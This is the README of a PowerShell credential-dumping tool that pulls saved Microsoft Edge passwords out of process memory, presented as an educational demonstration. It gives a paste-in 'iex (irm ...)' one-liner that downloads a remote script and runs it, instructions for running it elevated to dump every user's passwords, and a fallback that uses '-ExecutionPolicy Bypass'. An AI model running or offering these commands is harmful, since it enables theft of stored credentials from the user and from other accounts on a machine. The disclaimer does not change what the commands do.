## EdgeSavedPasswordsDumper (PowerShell)
*Educational tool — demonstrates that Edge stores saved credentials in cleartext in process memory.*

## Run

Paste in any PowerShell window:

```powershell
iex (irm 'https://raw.githubusercontent.com/kingdom84521/EdgeSavedPasswordsDumper/main/Dump-EdgePasswords.ps1')
```

To scan every user's Edge (not just yours), open an **elevated** PowerShell first (Win+X → *Terminal (Admin)*) and paste the same line.

> Saved credentials only land in memory **after Edge autofills**. If you get `0 matches`, visit a site with a saved password, let it autofill, then re-run *without restarting Edge*.

## Fallback — download and run locally

If `iex` fails (offline / network blocked / corp proxy):

1. Download `Dump-EdgePasswords.ps1` from this repo.
2. Run from PowerShell in the same folder:

   ```powershell
   powershell -ExecutionPolicy Bypass -File .\Dump-EdgePasswords.ps1
   ```

   `-ExecutionPolicy Bypass` applies only to that one invocation — system policy is unchanged.

## Disclaimer

Strictly educational. The author provides no warranty and accepts no liability for misuse.
